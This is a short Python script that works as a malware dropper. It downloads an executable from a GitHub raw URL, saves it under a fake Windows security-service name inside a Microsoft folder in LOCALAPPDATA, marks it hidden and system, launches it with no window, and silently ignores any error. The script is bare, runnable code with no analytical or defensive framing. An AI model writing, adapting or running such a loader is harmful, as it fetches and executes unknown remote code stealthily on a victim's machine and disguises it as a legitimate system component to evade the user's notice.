import os
import requests
import subprocess
import sys
URL = "https://github.com/iDorofa/REMOTEPL/raw/109adb006763ad20126d9830a65ed8137581ddbd/Windows.Security.Health.Service.Host.Container.Runtime.exe"


DEST_DIR = os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Windows", "IdentityCRL")
DEST_FILE = os.path.join(DEST_DIR, "Windows.Security.Health.Service.Host.Container.Runtime")

def install_and_run():
    if not os.path.exists(DEST_DIR):
        os.makedirs(DEST_DIR)

    try:
        response = requests.get(URL, stream=True)
        if response.status_code == 200:
            with open(DEST_FILE, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            os.system(f'attrib +h +s "{DEST_FILE}"')

            subprocess.Popen([DEST_FILE], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception:
        pass 

if __name__ == "__main__":
    install_and_run()
